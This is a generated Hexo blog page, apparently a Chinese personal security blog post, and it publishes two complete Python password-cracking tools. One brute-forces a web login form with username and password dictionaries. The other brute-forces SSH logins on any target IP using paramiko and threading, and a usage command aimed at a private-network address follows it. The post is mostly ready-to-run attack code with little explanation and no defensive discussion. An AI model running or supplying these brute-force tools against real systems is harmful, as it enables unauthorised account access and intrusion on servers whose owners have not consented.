@@ -1,0 +1,831 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>python安全攻防 - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-16 11:24" pubdate>
+        2021年8月16日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">python安全攻防</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：7 个月前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
+<blockquote>
+<p>passwords：密码字典 </p>
+<p>username:   账号字典</p>
+<p>result: 保存结果</p>
+<p>WeakPass.py :破解程序</p>
+</blockquote>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment"># 对字典的分块大小</span>
+BLOCK_SIZE = <span class="hljs-number">1000</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>
+    url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>
+
+    headers = &#123;
+            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27;</span>
+            <span class="hljs-string">&#x27;(KHTML, like Gecko) &#x27;</span>
+            <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>
+        self.username = username
+        self.password = password
+
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+        data = &#123;
+            <span class="hljs-string">&#x27;username&#x27;</span>:username,
+            <span class="hljs-string">&#x27;password&#x27;</span>:password,
+            <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>
+        &#125;
+        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
+        response = requests.post(self.url, data=data, headers=self.headers)
+
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:
+            <span class="hljs-keyword">pass</span>
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+            resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
+            resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+            resultFile.close()
+            <span class="hljs-comment"># 程序终止，0表示正常退出</span>
+            <span class="hljs-comment"># os._exit(0) </span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:
+            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:
+                self.run(userItem, pwdItem)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>
+
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
+
+    <span class="hljs-comment"># 对密码和用户名进行分块处理</span>
+    blockUsername = partition(listUsername, BLOCK_SIZE)
+    blockPassword = partition(listPassword, BLOCK_SIZE)
+
+    threads = []
+    <span class="hljs-comment"># 将不同的密码子块分给不同的线程爆破</span>
+    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
+        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
+
+            work = ThreadWork(sonUserBlock, sonPwdBlock)
+            workThread = threading.Thread(target=work.start)
+
+            threads.append(workThread)
+
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.start()
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.join()
+
+<span class="hljs-comment"># 将密码和账号分块函数</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>
+    res = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):
+        res.append(ls[i: i+size])
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    time1 = time.time()
+    BruteForceHttp()
+    time2 = time.time()
+    print(time2-time1)</code></pre></div>
+
+<p>七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题</p>
+<h1 id="多线程破解SSH密码"><a href="#多线程破解SSH密码" class="headerlink" title="多线程破解SSH密码"></a>多线程破解SSH密码</h1><blockquote>
+<p>passwords：密码字典 </p>
+<p>username:   账号字典</p>
+<p>result: 保存结果</p>
+<p>SSHattack:连接日志</p>
+<p>brute_SSH.py: 破解程序</p>
+</blockquote>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-keyword">import</span> optparse
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> paramiko
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        self.usernameBlock = usernameBlock
+        self.passwordBlock = passwordBlock
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">        使用死循环</span>
+<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+            <span class="hljs-keyword">try</span>:
+                paramiko.util.log_to_file(<span class="hljs-string">&quot;SSHattack.log&quot;</span>)
+                ssh = paramiko.SSHClient()
+
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))
+                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)
+                ssh.close()
+                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))
+
+                resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
+
+                resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+                resultFile.close()
+
+                os._exit(<span class="hljs-number">0</span>)
+            <span class="hljs-keyword">except</span> paramiko.ssh_exception.AuthenticationException <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">break</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:
+            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:
+                self.run(userItem, pwdItem)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>
+    step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)
+    <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:
+        step = num
+    partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]
+    <span class="hljs-keyword">return</span> partition
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>
+    print(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
+    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
+    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
+    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
+    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
+    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
+    print(<span class="hljs-string">&quot;=================================&quot;</span>)
+
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
+
+    <span class="hljs-comment"># 读取账号文件和密码文件并存入对应列表</span>
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(usernameFile)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(passwordFile)]
+    <span class="hljs-comment"># 账号列表和密码列表根据线程数量进行分块</span>
+    blockUsername = partition(listUsername, threadNumber)
+    blockPassword = partition(listPassword, threadNumber)
+    threads = []
+    <span class="hljs-comment"># 每个线程分配一个账号密码子块</span>
+    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
+        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
+            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)
+            <span class="hljs-comment"># 创建线程</span>
+            workThread = threading.Thread(target=work.start)
+            <span class="hljs-comment"># 在threads中加入线程</span>
+            threads.append(workThread)
+    <span class="hljs-comment"># 开始子线程</span>
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.start()
+    <span class="hljs-comment"># 阻塞主线程，等待所有子线程完成工作</span>
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.join()
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    parser = optparse.OptionParser(<span class="hljs-string">&#x27;usage: python %prog target [options] \n\n&#x27;</span>
+                                   <span class="hljs-string">&#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n&#x27;</span>)
+    <span class="hljs-comment"># 添加目标主机参数-i</span>
+    parser.add_option(<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ip&#x27;</span>, dest=<span class="hljs-string">&#x27;IP&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target IP&#x27;</span>)
+    <span class="hljs-comment"># 添加线程参数-t</span>
+    parser.add_option(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--threads&#x27;</span>, dest=<span class="hljs-string">&#x27;threadNum&#x27;</span>,
+                      default=<span class="hljs-number">10</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Number of threads [default = 10]&#x27;</span>)
+    <span class="hljs-comment"># 添加用户名文件参数-u</span>
+    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, dest=<span class="hljs-string">&#x27;userName&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;./username&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;username file&#x27;</span>)
+    <span class="hljs-comment"># 添加密码文件参数-p</span>
+    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--password&#x27;</span>, dest=<span class="hljs-string">&#x27;passWord&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;./password&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;password file&#x27;</span>)
+    <span class="hljs-comment"># 添加SSH端口参数-P</span>
+    parser.add_option(<span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, dest=<span class="hljs-string">&#x27;port&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;ssh port&#x27;</span>)
+    (options, args) = parser.parse_args()
+
+    SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port)
+</code></pre></div>
+
+<p>使用方法</p>
+<div class="hljs"><pre><code class="hljs stylus">python brute_SSH<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">164.166</span> -u ./username -<span class="hljs-selector-tag">p</span> ./passwords</code></pre></div>
+
+
+
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825163939574.png" srcset="/img/loading.gif" alt="image-20210825163939574" style="zoom:80%;">
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/python/">python</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/13/test/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">test</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/06/maliciousUrls/">
+                        <span class="hidden-mobile">商品评价情感分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "python安全攻防&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
